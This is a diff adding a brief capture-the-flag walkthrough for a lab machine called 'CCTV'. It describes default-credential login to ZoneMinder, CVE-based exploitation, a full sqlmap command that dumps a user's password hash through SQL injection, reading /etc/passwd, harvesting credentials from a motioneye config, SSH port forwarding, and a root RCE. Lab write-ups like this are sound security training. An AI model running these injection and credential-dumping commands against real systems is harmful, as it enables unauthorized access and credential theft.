@@ -1,0 +1,43 @@
+[Profile]{
+Machine: CCTV
+ip: 10.129.244.156
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn 10.129.244.156
+|ssh http
+
+Looking at the website, we see the staff login, we try to login as admin:admin, and it works !
+We enter and see it is ZoneMinder v 1.37.63
+And we found  CVE-2026-27470, let's try this. It works we retrieve hashes ( and it seems to be md5 )
+In the zm website, we found that users admin, mark and superadmin.
+Let's try to get their passwords.
+Trying with a poc I get, there I only receive auth hash, change try to adapt cve-2024-54182 ( using sqlmap with ZMSESSID ) and we get the password hash of mark.
+```bash
+sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=tqv1qq21e1vuao1of41e1ssq89" -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
+```
+Let'use this to connect over ssh.
+And we are in !
+}
+
+[Exploitation]{
+```bash 
+cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+mark:x:1000:1000:mark:/home/mark:/bin/bash
+sa_mark:x:1001:1001::/home/sa_mark:/bin/sh
+```
+The user.txt seems to be in /home/sa_mark. Let's continue our walk.
+}
+
+[PrivEsc]{
+now we look for the service motioneye, and we find credentials for the admin user ( in the /etc/motioneye/motion.conf ), let's port forwarding it through ssh and test it.
+ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+And we get the portal on the login page.
+
+Continuing we use the cve-2025-60787 powering us with root rce, then we got it all.
+root.txt *-* user.txt
+}
